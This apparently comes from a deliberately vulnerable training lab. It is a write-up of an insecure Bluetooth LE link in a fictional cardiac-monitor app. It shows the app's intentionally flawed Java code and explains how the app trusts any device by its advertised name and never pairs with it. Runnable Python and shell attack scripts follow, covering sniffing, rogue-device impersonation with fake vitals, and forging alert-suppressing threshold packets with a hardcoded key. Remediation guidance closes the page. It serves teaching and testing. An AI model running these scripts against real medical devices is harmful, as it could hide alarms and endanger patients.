---
id: M5
title: "Insecure Communication"
category: Mobile
status: DONE
severity: High
owasp: "Mobile M5 — Insecure Communication"
cwe: "CWE-300 (Channel Accessible by Non-Endpoint 'Man-in-the-Middle') / CWE-940 (Improper Verification of Source of a Communication Channel) / CWE-319 (Cleartext Transmission of Sensitive Information) / CWE-306 (Missing Authentication for Critical Function)"
source_docs:
  - "CareOtter_App.md (VULN #1 missing pairing → M3, VULN #5 unencrypted channel → M5, and the M4 untrusted-name section)"
  - "Vulns/IoT/IoT3_Insecure_Ecosystem_Interfaces.md §A.7 (the same case as the mobile-interface facet of OWASP IoT I3)"
affected_components:
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/BleMonitorClient.java — startScan / connect / writeThreshold"
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/MainActivity.java — Scan & Connect entry point"
verified_date: ""
---

# M5 — Insecure Communication

> **Status:** DONE
> **OWASP:** Mobile M5 — Insecure Communication
> **CWE:** CWE-300 / CWE-940 / CWE-319 / CWE-306
> **Severity:** High

---

## Why It Matters

The CareOtter patient app is a BLE-only client. Every reading it shows — heart rate, SpO2 — and every threshold it writes crosses one channel: a Bluetooth Low Energy link to the bedside monitor. OWASP Mobile M5 is about that channel being established and used insecurely, so an attacker can eavesdrop on it, tamper with it, or impersonate the device on the far end. On a cardiac monitor, the integrity and authenticity of that link is the difference between a clinician seeing the patient's real vitals and seeing whatever an attacker in the room decides to send.

The app gets the channel wrong in the two ways that together define an insecure-communication MITM. It picks the device to talk to by advertised name alone, so any peripheral broadcasting `CareOtter_HR` is accepted as the monitor ([[#5.1 — Device identity verified by advertised name only]]). And it then opens the GATT link with no pairing, no bonding, and no LE Secure Connections, so the link is neither authenticated nor encrypted ([[#5.2 — No pairing, bonding, or LE Secure Connections]]). The result is a channel an attacker in Bluetooth range can stand in the middle of, with no certificate to forge and no key to break.

---

## OWASP Classification

| Category | Role |
|---|---|
| **M5 — Insecure Communication** | Primary — the app connects to an unauthenticated, unverified BLE peer over an unencrypted link, so the clinical channel is interceptable, tamperable, and impersonable (MITM) |
| **M3 — Insecure Authentication/Authorization** | Secondary — no pairing or bonding, so the peer device is never authenticated (CWE-306). The companion failure to authenticate the *operation* (replayable CSCP token, no per-user authorization) is owned by [[M3_Insecure_Authentication_Authorization]] |
| **M4 — Insufficient Input/Output Validation** | Contributing — the advertised device name is treated as a trusted identity with no MAC, service-UUID, or manufacturer-data check |
| **M1 — Improper Credential Usage** | Contributing — pivoting the MITM into a write against the *real* monitor needs the fleet-wide CSCP key, statically extractable from the same APK. Owned by [[M1_Improper_Credential_Usage]] (the APK key) and [[IoT7_Insecure_Data_Transfer_and_Storage]] (the device side) |

**Why M5 over M3 or M4.** The 2024 M3 category is principally about authenticating the *user* and enforcing authorization, whereas the defect here is the security of the *communication channel* to a peripheral — endpoint identity verification, MITM resistance, and encryption — which is M5's defined scope. The M4 framing used in `CareOtter_App.md` (the advertised name as untrusted input) describes the mechanism but not the realized risk, which is an intercepted and impersonated channel. `CareOtter_App.md` historically split this story across VULN #1 (M3), the M4 section, and VULN #5 (M5). This page consolidates it under M5 as the primary lens and keeps M3 and M4 as the secondary facets.

This is the same defect documented from the ecosystem-interface side as the mobile facet of OWASP IoT I3 — see [[IoT3_Insecure_Ecosystem_Interfaces]] §A.7.

---

## 5.1 — Device identity verified by advertised name only

`BleMonitorClient.startScan()` scans for peripherals and connects to the first one whose advertised name equals `CareOtter_HR`. Nothing else is checked — not the MAC address, not the service UUIDs, not the manufacturer data — and the scan stops on the first match, so other devices are never even surfaced to the UI. The source self-documents the flaw:

```java
// BleMonitorClient.java
public static final String DEVICE_NAME = "CareOtter_HR";

// VULNERABILITY: device identity is verified only by advertised name, which any
// rogue BLE peripheral can spoof. An attacker broadcasting "CareOtter_HR" will
// cause this app to connect and receive/send fabricated vitals data with no
// further authentication check.
public void startScan() {
    ...
    activeScanCallback = new ScanCallback() {
        @Override
        public void onScanResult(int callbackType, ScanResult result) {
            BluetoothDevice device = result.getDevice();
            String name = device.getName();
            // Only react to the exact target name — but name is attacker-controlled
            if (DEVICE_NAME.equals(name)) {
                stopScan();
                connect(device.getAddress());   // first match wins, scan stops
            }
        }
    };
    scanner.startScan(activeScanCallback);       // no ScanFilter, no service-UUID filter
}
```

The advertised name is data the attacker fully controls. A rogue peripheral that advertises `CareOtter_HR` with a stronger signal than the real Pi wins the "first match" race, and the app connects to it without ever verifying it reached the genuine monitor (CWE-940 — Improper Verification of Source of a Communication Channel).

---

## 5.2 — No pairing, bonding, or LE Secure Connections

Having chosen a peer by name, the app opens the GATT connection with bonding left to its default and no security level requested:

```java
/** Connect by MAC address. VULNERABILITY: no pairing, no bonding. */
public void connect(String address) {
    BluetoothDevice device = bluetoothAdapter.getRemoteDevice(address);
    // AUTOCONNECT = false, no bonding enforced
    gatt = device.connectGatt(context, false, gattCallback);   // no createBond(), no LE Secure Connections
}
```

There is no `createBond()`, no requirement for an encrypted link, and no MITM protection. The consequences are the two halves of M5:

- **No authentication of the peer (CWE-306).** Pairing and bonding are BLE's mechanism for authenticating the device on the other end. Without them the link will talk to anyone, which is what makes §5.1's name-spoof actionable.
- **No encryption of the link (CWE-319).** Heart-rate (`0x180D`) and pulse-oximetry (`0x1822`) notifications, and the threshold write to `0xFF01`, travel as cleartext over the air. A passive sniffer in range reads the patient's vitals with no key, and an active attacker tampers with them in flight.

---

## Attack flow — rogue-device MITM

The full attack needs only a BLE adapter in Bluetooth range (~10 m), no pairing, and no prior access to the device or the app's data.

1. **Recon.** Passively scan for the legitimate peripheral to read its name and MAC.

   ```bash
   sudo hcitool lescan --duplicates
   # 43:45:C0:00:1F:AC  CareOtter_HR
   ```

2. **Clone the advertisement.** Broadcast the same name from an attacker peripheral (a second adapter, a Pi, or nRF Connect in advertiser mode), with a stronger signal so it wins the first-match race.

   ```bash
   sudo hciconfig hci0 name "CareOtter_HR"
   sudo hciconfig hci0 leadv 0
   ```

3. **Capture the app.** When the technician or patient taps *Scan & Connect*, `startScan()` matches the rogue by name and connects to it — no pairing prompt, no warning.

4. **Impersonate the device.** The rogue serves the standard GATT services and pushes fabricated `0x180D` / `0x1822` notifications. The app displays attacker-chosen vitals and drives its local alert banner accordingly — a fake calm (steady 72 BPM while the patient deteriorates) or a fake panic (BPM 0 / 250 to provoke alarm fatigue).

5. **Or just listen.** Because the genuine link is unencrypted, the attacker can instead sniff the real connection and read the patient's vitals in cleartext, with no impersonation and no trace on the device.

6. **Pivot to the real monitor (combined chain, not M5 alone).** MITM of the app does not by itself change the bedside monitor. Writing lethal thresholds to the genuine device additionally requires the fleet-wide CSCP key, which is statically extractable from the same APK. That half is owned by [[IoT7_Insecure_Data_Transfer_and_Storage]]. M5 supplies the unauthenticated, unencrypted channel — IoT7 supplies the forgeable payload.

---

## Reproduction — hands-on scripts

The conceptual flow above becomes the runnable variants below. One caveat first: `hcitool` and `hciconfig … leadv` are deprecated, and `leadv` only broadcasts a name — it does not stand up the GATT services the app subscribes to, so on its own the app connects and then receives nothing. A working impersonation needs a real GATT server, which is Variant D. Each variant maps to an item in the Verification Checklist.

### Recovering the constants (static and dynamic analysis)

None of the literals in the scripts below are values the attacker is assumed to already know. Each one is recovered first, by static analysis of the APK or firmware, by dynamic analysis of the live BLE link, or both. The split is the point: everything at the GATT layer is recoverable purely dynamically because the link is open and unauthenticated (that is the M5 finding itself), while the CSCP crypto constants never travel in clear and must be lifted statically (OWASP M1, owned by [[IoT7_Insecure_Data_Transfer_and_Storage]] and [[M1_Improper_Credential_Usage]]).

| Script literal | What it is | How the attacker recovers it |
|---|---|---|
| `DEVICE_NAME` = `CareOtter_HR` | advertised BLE name | Dynamic: the Variant A scan shows it. Static: `BleMonitorClient.DEVICE_NAME` in the APK via jadx. |
| `TARGET_MAC` = `43:45:C0:00:1F:AC` | device address (per unit, not fleet-wide) | Dynamic: the Variant A scan prints the address next to the name. |
| `HR_SVC` `0x180D` / `HR_CHR` `0x2A37` | Heart Rate service + Measurement characteristic | Standard Bluetooth SIG assigned numbers. Dynamic: GATT enumeration (nRF Connect, `bluetoothctl list-attributes`) lists them after a no-pairing connect. Static: the UUID constants in `BleMonitorClient`. |
| `PLX_SVC` `0x1822` / `PLX_CHR` `0x2A5F` | Pulse Oximeter service + PLX Continuous characteristic | Same — SIG-standard, enumerable on the wire, and present in the APK. |
| HR bytes `[0x06, bpm]` | HR Measurement notification format | SIG format (byte 0 flags, byte 1 uint8 BPM). Dynamic: subscribe (Variant B) or sniff (Variant C) and watch byte 1 track the pulse. Static: `onCharacteristicChanged` reads `value[1]`. |
| PLX bytes `[0x03, spo2, 0x00, bpm, 0x00]` | PLX notification format | Dynamic: watch byte 1 track SpO2. Static: the device `ble_server.py` encoder and the app parse. |
| `THRESHOLD` `0xFF01` | vendor Alert Threshold characteristic | Dynamic: GATT enumeration surfaces the non-standard, writable `0xFF00`/`0xFF01` pair. Static: the `ALERT_THRESHOLD` UUID in the APK. |
| `MAGIC` `0xCAFE0DDA` | CSCP v1 packet magic | Static only: `jadx`/`strings` on the APK (`CareOtterConfig`) or firmware `ble_server.py`. Never transmitted in clear. |
| `KEY` `careotter-key-16` | fleet-wide AES-128-ECB CSCP key | Static only: `strings`/`jadx` on the APK → `CSCP_KEY`. OWASP M1, full treatment in [[IoT7_Insecure_Data_Transfer_and_Storage]] §7.1. |
| CSCP packet `[magic 4B][crc32 4B][AES-ECB(bpm_min,bpm_max,spo2_min,pad) 16B]` | 24-byte threshold packet | Static: reverse the APK pack/encrypt routine, or read `ble_server.py::_pack_and_encrypt`. |

Two concrete recovery paths feed the tables:

- **Static (APK / firmware).** Decompile and grep. This is the only way to obtain `KEY`, `MAGIC`, and the packet structure:

  ```bash
  jadx careotter_app.apk -d out/
  grep -rEi "180d|2a37|1822|2a5f|ff01|CSCP_KEY|CSCP_MAGIC|careotter-key" out/
  ```

- **Dynamic (live link, no APK).** Connect with nRF Connect or `bluetoothctl` (no pairing) and `list-attributes`, or run Variant A's `scan.py` which prints `service_uuids`, then Variant B or C to watch the notification bytes change with the real vitals. This recovers every GATT-layer value without ever touching the APK — precisely because the link is open.

So Variants A–D need only dynamic recon. Variant E additionally needs the static extraction of `KEY`/`MAGIC`, which is exactly why the pivot is filed under M1/IoT7 and not M5. When you write your own scripts, treat the literals as outputs of these two steps, not as givens.

### Prerequisites

Run from Kali (or any BlueZ 5.x Linux) with a USB BLE adapter. The true over-the-air sniff (Variant C) additionally needs an nRF52840 dongle or an Ubertooth.

```bash
# bluezero (Variant D) needs the system D-Bus + GLib bindings, so install them
# and create the venv with --system-site-packages so it can see them.
sudo apt install -y bluez bluez-tools python3-venv python3-dbus python3-gi
python3 -m venv --system-site-packages ~/m5-venv && source ~/m5-venv/bin/activate
pip install bleak pycryptodome bluezero

bluetoothctl list            # Controller XX:XX:XX:XX:XX:XX ... [default]

export TARGET_NAME="CareOtter_HR"
export TARGET_MAC="43:45:C0:00:1F:AC"   # fill in from Variant A
```

If `bluetoothctl connect` drops the LE link with `org.bluez.Error.BREDR.ProfileUnavailable`, switch the adapter to LE-only (same fix as the provisioning backdoor in [[IoT2_Insecure_Network_Services]] §2.4):

```bash
sudo sed -i 's/^#ControllerMode = dual$/ControllerMode = le/' /etc/bluetooth/main.conf
sudo systemctl restart bluetooth
```

### Variant A — Recon and enumerate (maps §5.1)

Interactive scan:

```bash
bluetoothctl
# Relax the BlueZ discovery filter BEFORE scanning. The Pi advertises LE-only
# through a weak PCB antenna, and the default filter (transport=auto, an RSSI
# floor, and duplicate collapse) drops it even though a phone still shows it.
[bluetooth]# menu scan
[bluetooth]# transport le
[bluetooth]# rssi -127
[bluetooth]# duplicate-data on
[bluetooth]# back
[bluetooth]# scan on
# wait for: [NEW] Device 43:45:C0:00:1F:AC CareOtter_HR
[bluetooth]# scan off
[bluetooth]# info 43:45:C0:00:1F:AC      # note: Paired: no   Bonded: no
```

If `scan on` lists no `CareOtter_HR`, the cause is almost always that filter, not range — the same advert is visible to a phone and to `btmgmt find -l` / `sudo btmon`. The non-interactive equivalent of the relaxed scan, which is how this was confirmed in the lab:

```bash
{ echo "menu scan"; echo "transport le"; echo "rssi -127"; echo "duplicate-data on"; \
  echo "back"; echo "scan on"; sleep 20; echo "devices"; echo "quit"; } \
  | bluetoothctl 2>&1 | grep -i careotter
# Device 43:45:C0:00:1F:AC CareOtter_HR
```

`bleak` needs one specific tweak on Linux, verified against the live lab device. Its BlueZ backend defaults to `DuplicateData=False`, which makes BlueZ coalesce this device's intermittent, scan-response-only name and frequently drop the device altogether — so a default `BleakScanner`, `find_device_by_name`, and even `BleakClient(address)` all fail with the Pi advertising right there at a strong RSSI. The fix is to force `DuplicateData=True` (the bleak equivalent of `duplicate-data on`) with active scanning, and to match on the MAC as well as the name. Every `bleak` script below already does this.

Scripted scan that dumps the advertisement (name, RSSI, service UUIDs, manufacturer data):

```python
#!/usr/bin/env python3
# scan.py — discover CareOtter_HR and dump its advertisement data.
# bleak's default DuplicateData=False drops this device; force it True + active.
import asyncio
from bleak import BleakScanner

TARGET_MAC = "43:45:C0:00:1F:AC"   # from the bluetoothctl relaxed scan

def cb(dev, adv):
    if dev.address.upper() == TARGET_MAC or "CareOtter" in (adv.local_name or ""):
        mfg = {hex(k): v.hex() for k, v in adv.manufacturer_data.items()}
        print(f"[+] {dev.address}  rssi={adv.rssi}dBm  name={adv.local_name}")
        print(f"    service_uuids={adv.service_uuids}")
        print(f"    manufacturer_data={mfg}")

async def main():
    s = BleakScanner(detection_callback=cb, scanning_mode="active",
                     bluez={"filters": {"DuplicateData": True}})
    await s.start(); await asyncio.sleep(20); await s.stop()

asyncio.run(main())
```

Company ID `0x08d4` in `manufacturer_data` decodes to the Cloud API IP:port and the device WiFi IP — see [[IoT6_Insufficient_Privacy_Protection]] §6.1 for the byte layout.

### Variant B — Connect unauthenticated, read vitals in cleartext (confirms §5.2)

The cheapest proof that the link is unauthenticated and unencrypted: a plain client connects with no pairing and the clinical notifications stream in. Run it against the real Pi.

```python
#!/usr/bin/env python3
# read_vitals.py — connect with NO pairing and read HR/SpO2 notifications.
import asyncio
from bleak import BleakScanner, BleakClient

TARGET_MAC = "43:45:C0:00:1F:AC"
HR  = "00002a37-0000-1000-8000-00805f9b34fb"   # app parses value[1] as BPM
PLX = "00002a5f-0000-1000-8000-00805f9b34fb"   # app parses value[1] as SpO2

def on_hr(_, d):  print(f"[HR ] raw={d.hex():<12} BPM={d[1]}")
def on_plx(_, d): print(f"[PLX] raw={d.hex():<12} SpO2={d[1]}")

async def find_careotter(timeout=20):
    # bleak's default DuplicateData=False drops this device — force it on.
    found = {}
    def cb(d, adv):
        if d.address.upper() == TARGET_MAC or "CareOtter" in (adv.local_name or ""):
            found.setdefault("dev", d)
    s = BleakScanner(detection_callback=cb, scanning_mode="active",
                     bluez={"filters": {"DuplicateData": True}})
    await s.start()
    for _ in range(timeout):
        await asyncio.sleep(1)
        if "dev" in found:
            break
    await s.stop()
    return found.get("dev")

async def main():
    dev = await find_careotter()
    if not dev:
        print("[-] CareOtter_HR not found"); return
    async with BleakClient(dev) as c:          # connects with no pairing/bonding
        print(f"[+] connected to {dev.address} — no pairing requested")
        await c.start_notify(HR,  on_hr)
        await c.start_notify(PLX, on_plx)
        await asyncio.sleep(30)

asyncio.run(main())
```

Expected: a stream of `BPM=…` / `SpO2=…` lines. Confirm no bond was formed with `bluetoothctl info $TARGET_MAC` reporting `Paired: no` and `Bonded: no`. These same cleartext bytes are what a passive sniffer captures in Variant C.

![[m5_variant_b.png]]

### Variant C — Passive over-the-air sniff (confirms §5.2)

Capture the genuine app↔device link without connecting to it.

nRF52840 dongle + nRF Sniffer for BLE + Wireshark:

```text
1. Flash the dongle with "nRF Sniffer for Bluetooth LE" (nRF Util / nRF Connect Programmer).
2. Install the nRF Sniffer Wireshark extcap plugin, then restart Wireshark.
3. Wireshark -> interface "nRF Sniffer for Bluetooth LE COMx".
4. In the sniffer toolbar "Device" dropdown, pick CareOtter_HR to follow it.
5. Start the capture, then open the patient app and connect to the real Pi.
```

Useful Wireshark display filters:

```text
btatt.opcode == 0x1b           # Handle Value Notification — the vitals stream
btatt.handle == <hr_handle>    # narrow to the HR characteristic value handle
```

Each HR notification is `[flags][bpm]`, so read the second value byte as BPM. Each SpO2 notification's second byte is the SpO2 percent. No key is needed because the link is never encrypted.

Ubertooth alternative (follows one connection, less reliable across channel hops):

```bash
ubertooth-btle -f -t $TARGET_MAC -c /tmp/careotter.pcap
wireshark /tmp/careotter.pcap
```

### Variant D — Rogue device impersonation / MITM (confirms §5.1 + MITM)

Stand up a peripheral that advertises the trusted name and serves the two vitals characteristics with attacker-chosen values. With the real Pi off or weaker, the app's first-match-by-name scan connects here instead.

Scripted (bluezero) — `find_careotter` is reused here as a recon/preflight: it confirms the genuine monitor is present, reports the RSSI you must out-power to win the app's first-match race, and harvests its advertised beacon to clone, then the rogue is published. This script needs the `--system-site-packages` venv from Prerequisites, because bluezero imports the system `dbus`/`gi` bindings.

```python
#!/usr/bin/env python3
# rogue_careotter.py — recon the genuine CareOtter_HR with find_careotter,
# then impersonate it with attacker-chosen vitals.
# Needs the --system-site-packages venv (bluezero imports system dbus + gi).
import asyncio
from bleak import BleakScanner
from bluezero import adapter, peripheral, async_tools

TARGET_MAC = "43:45:C0:00:1F:AC"
ATTACK_BPM, ATTACK_SPO2 = 72, 98        # fake-calm; fake-panic e.g. 250, 70

HR_SVC  = '0000180d-0000-1000-8000-00805f9b34fb'
HR_CHR  = '00002a37-0000-1000-8000-00805f9b34fb'
PLX_SVC = '00001822-0000-1000-8000-00805f9b34fb'
PLX_CHR = '00002a5f-0000-1000-8000-00805f9b34fb'

async def find_careotter(timeout=20):
    # Same discovery fix as the other scripts: bleak defaults to
    # DuplicateData=False and drops this device. Returns (BLEDevice, AdvData).
    found = {}
    def cb(d, adv):
        if d.address.upper() == TARGET_MAC or "CareOtter" in (adv.local_name or ""):
            found.setdefault("hit", (d, adv))
    s = BleakScanner(detection_callback=cb, scanning_mode="active",
                     bluez={"filters": {"DuplicateData": True}})
    await s.start()
    for _ in range(timeout):
        await asyncio.sleep(1)
        if "hit" in found:
            break
    await s.stop()
    return found.get("hit")

def hr_bytes():  return [0x06, ATTACK_BPM & 0xFF]                           # app reads [1]
def plx_bytes(): return [0x03, ATTACK_SPO2 & 0xFF, 0x00, ATTACK_BPM & 0xFF, 0x00]
def push_hr(chrc):  chrc.set_value(hr_bytes());  return chrc.is_notifying
def push_plx(chrc): chrc.set_value(plx_bytes()); return chrc.is_notifying
def on_hr(notifying, chrc):
    if notifying: async_tools.add_timer_seconds(1, push_hr, chrc)
def on_plx(notifying, chrc):
    if notifying: async_tools.add_timer_seconds(1, push_plx, chrc)

# Recon: confirm the genuine device and harvest its beacon to clone.
rec = asyncio.run(find_careotter())
clone_mfg = {}
if rec:
    dev, adv = rec
    clone_mfg = dict(adv.manufacturer_data or {})
    print(f"[*] genuine CareOtter_HR at {dev.address} rssi={adv.rssi}dBm name={adv.local_name!r}")
    print(f"    -> out-power {adv.rssi}dBm (be closer / higher TX) to win the first-match race")
else:
    print("[!] genuine device not seen — advertising the clone blind")

# Impersonate: clone name + services (auto-advertised) + the harvested beacon.
addr  = list(adapter.Adapter.available())[0].address
rogue = peripheral.Peripheral(addr, local_name='CareOtter_HR')
rogue.add_service(srv_id=1, uuid=HR_SVC, primary=True)
rogue.add_characteristic(srv_id=1, chr_id=1, uuid=HR_CHR, value=hr_bytes(),
                         notifying=False, flags=['read', 'notify'], notify_callback=on_hr)
rogue.add_service(srv_id=2, uuid=PLX_SVC, primary=True)
rogue.add_characteristic(srv_id=2, chr_id=1, uuid=PLX_CHR, value=plx_bytes(),
                         notifying=False, flags=['read', 'notify'], notify_callback=on_plx)
for company_id, blob in clone_mfg.items():        # clone the 0x08d4 beacon (best-effort)
    try:
        rogue.advert.manufacturer_data(company_id, list(blob))
    except Exception as e:
        print(f"    (mfg clone skipped for {hex(company_id)}: {e})")
print('[*] Advertising rogue CareOtter_HR — tap "Scan & Connect" in the app')
rogue.publish()
```

No-code (nRF Connect for Android), the more reliable path on a phone:

```text
1. nRF Connect -> "GATT Server" -> add services:
   - 0x180D, characteristic 0x2A37, property NOTIFY, value (hex)  06 48          (0x48 = 72 BPM)
   - 0x1822, characteristic 0x2A5F, property NOTIFY, value (hex)  03 62 00 48 00 (0x62 = 98%)
2. "Advertiser" -> new config: Complete Local Name "CareOtter_HR",
   Connectable + Scannable, include the 0x180D / 0x1822 service UUIDs, Start.
3. Open the patient app, Scan & Connect — it binds to the phone, not the Pi.
4. Back in nRF Connect, tap Notify on each characteristic to push values.
```

```bash
./m5-venv/bin/python -u ./rogue_careotter.py
```

![[m5_variant_d_app_spoofed.png|300]]

Escalations: set the attacker values to `250, 70` for fake-panic and alarm fatigue, or drop the timer to a sub-second loop (`async_tools.add_timer_ms`) to flood the app UI and its plaintext `VitalsLogger` writes (the patient-side DoS).

### Variant E — Pivot to the real monitor (combined with IoT7)

The MITM above only fools the app. To change the genuine bedside monitor you write a forged CSCP v1 packet to its `0xFF01` over the same unauthenticated channel. The channel is M5, the forgeable payload and its crypto are owned by [[IoT7_Insecure_Data_Transfer_and_Storage#7.1 — CSCP v1 threshold forging → deferred ZeroDivisionError DoS]].

```python
#!/usr/bin/env python3
# pivot_cscp.py — forge CSCP v1 and write it to the REAL device (no pairing).
import asyncio, struct, binascii
from bleak import BleakClient, BleakScanner
from Crypto.Cipher import AES

THRESHOLD = "0000ff01-0000-1000-8000-00805f9b34fb"
KEY       = b"careotter-key-16"     # fleet-wide, recovered from the APK (IoT7)
MAGIC      = 0xCAFE0DDA
TARGET_MAC = "43:45:C0:00:1F:AC"

def forge_cscp(bpm_min, bpm_max, spo2_min):
    pt  = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
    ct  = AES.new(KEY, AES.MODE_ECB).encrypt(pt)
    crc = binascii.crc32(ct) & 0xFFFFFFFF        # CRC is computed over the ciphertext
    return struct.pack(">II", MAGIC, crc) + ct   # 24 bytes, big-endian

async def find_careotter(timeout=20):
    # bleak's default DuplicateData=False drops this device — force it on.
    found = {}
    def cb(d, adv):
        if d.address.upper() == TARGET_MAC or "CareOtter" in (adv.local_name or ""):
            found.setdefault("dev", d)
    s = BleakScanner(detection_callback=cb, scanning_mode="active",
                     bluez={"filters": {"DuplicateData": True}})
    await s.start()
    for _ in range(timeout):
        await asyncio.sleep(1)
        if "dev" in found:
            break
    await s.stop()
    return found.get("dev")

async def main():
    pkt = forge_cscp(0, 255, 0)                  # suppress every clinical alert
    # DoS variant (deferred ZeroDivisionError, IoT7): forge_cscp(120, 40, 90)
    dev = await find_careotter()
    async with BleakClient(dev) as c:            # no pairing required
        await c.write_gatt_char(THRESHOLD, pkt, response=True)
        print(f"[+] wrote forged CSCP ({pkt.hex()}) — thresholds overwritten")

asyncio.run(main())
```

Verify on the device: `logread -e CSCP` shows the accepted write, and reading `0xFF01` back (the app, or `bluetoothctl`) returns the new thresholds. The `forge_cscp(120, 40, 90)` form sets `bpm_min > bpm_max` and crashes the notification loop about two seconds later — the deferred IoT7 DoS.

---

## Clinical Impact

| Stage | Consequence | Patient Safety Risk |
|---|---|---|
| §5.1 rogue connect | The app trusts an attacker's peripheral as the monitor | High — every reading shown is attacker-controlled |
| §5.2 passive sniff | The patient's vitals are read in cleartext from range | Medium — confidentiality breach (HIPAA/GDPR), no tamper |
| Fabricated vitals (fake calm) | A deteriorating patient shows normal BPM/SpO2, no alert fires | Critical — silent suppression of a clinical alarm |
| Fabricated vitals (fake panic) | Constant false criticals desensitise staff | High — alarm fatigue, real events missed |
| Combined with the CSCP key (IoT7) | Lethal thresholds written to the genuine monitor | Critical — therapeutic suppression on the real device |

---

## How It Should Be

- **Authenticate the channel.** Require LE Secure Connections pairing and bonding before exchanging any clinical data, so the peer device is cryptographically authenticated and the link is encrypted with MITM protection. An unbonded connection must be refused, not used.
- **Pin the device identity.** After first provisioning, bind to the monitor's bonded identity (resolvable private address / IRK), not to its advertised name. Never select a peer by a free-text name an attacker can broadcast.
- **Verify the advertisement, not just the name.** Match on service UUIDs and expected manufacturer data in a `ScanFilter`, and surface all matching devices for explicit selection rather than auto-connecting to the first name match.
- **Treat the BLE link as untrusted transport.** Even with pairing, sign or authenticate clinical payloads end to end so a single compromised link cannot inject silent threshold changes.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Pairing | LE Secure Connections + bonding required before data exchange | Authenticate the peer and encrypt the link (CWE-306 / CWE-319) |
| Identity | Pin the bonded device identity, reject unknown peers | Stop rogue-device impersonation (CWE-940) |
| Discovery | `ScanFilter` on service UUID + manufacturer data, manual device pick | Remove name-only auto-connect (the M4 facet) |
| Integrity | End-to-end signed clinical payloads over the BLE link | Stop in-flight tampering (CWE-300) |
| UX | Warn and block on an unbonded or downgraded connection | Make a MITM attempt visible to the operator |

---

## Verification Checklist

- [ ] **§5.1 (Variant D)**: a rogue peripheral advertising the name `CareOtter_HR` (bluezero script or nRF Connect advertiser) is auto-connected by *Scan & Connect* with no pairing prompt, even with the real Pi absent.
- [ ] **§5.1 (Variant D)**: the app connects on name alone — changing the rogue's MAC, dropping its service UUIDs, or omitting manufacturer data does not stop the connection.
- [ ] **§5.2 (Variant B)**: a plain client connects and streams HR/SpO2 notifications with no pairing, and `bluetoothctl info $TARGET_MAC` stays `Paired: no` / `Bonded: no`, confirming no LE Secure Connections.
- [ ] **§5.2 (Variant C)**: a passive BLE sniff (nRF Sniffer / Ubertooth) of the genuine link shows the `0x2A37` / `0x2A5F` notification values in cleartext.
- [ ] **MITM (Variant D)**: with the rogue serving fabricated `0x2A37` notifications, the app displays the attacker's BPM/SpO2 and its alert banner follows them.
- [ ] **Pivot (Variant E)**: the forged CSCP packet (key per [[IoT7_Insecure_Data_Transfer_and_Storage]] §7.1) written to `0xFF01` is accepted by the real monitor — confirms M5 channel + IoT7 payload.

---

## Glossary

| Term | Definition |
|---|---|
| **CSCP** | **CareOtter Secure Config Protocol** (version 1, "CSCP v1"). The vendor's proprietary BLE format for writing clinical alert thresholds (`bpm_min`, `bpm_max`, `spo2_min`) to GATT characteristic `0xFF01`. A 24-byte packet: `[magic 4B = 0xCAFE0DDA][CRC32 4B over the ciphertext][AES-128-ECB(3 threshold bytes + 13 null pad) 16B]`, keyed with the fleet-wide constant `careotter-key-16`. Marketed as "AES-128 military-grade encryption," but for M5 the point is that it provides no transport security for the link it rides — the threshold write (and the unrelated HR/SpO2 notifications) travel over an unauthenticated, unencrypted channel, so the packet is sniffable and the pivot in Variant E rides the same open link. Expanded in `docs/CareOtter/Architecture_Analysis.md`. |

---

## References

- `vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/BleMonitorClient.java` — `DEVICE_NAME`, `startScan` (name-only match), `connect` (no bonding), `writeThreshold`.
- `docs/CareOtter/Mobile/CareOtter_App.md` — VULN #1 (missing pairing → M3), VULN #5 (unencrypted channel → M5), and the M4 spoofing/MITM section that this page consolidates.
- [[IoT3_Insecure_Ecosystem_Interfaces]] §A.7 — the same defect as the mobile-interface facet of OWASP IoT I3.
- [[IoT7_Insecure_Data_Transfer_and_Storage]] — the fleet-wide CSCP key (M1/CWE-321) that turns the MITM into a write against the genuine device.
- Tooling: `hcitool lescan`, `hciconfig … name/leadv`, nRF Connect (advertiser), nRF Sniffer / `btmon`, `bettercap` BLE.
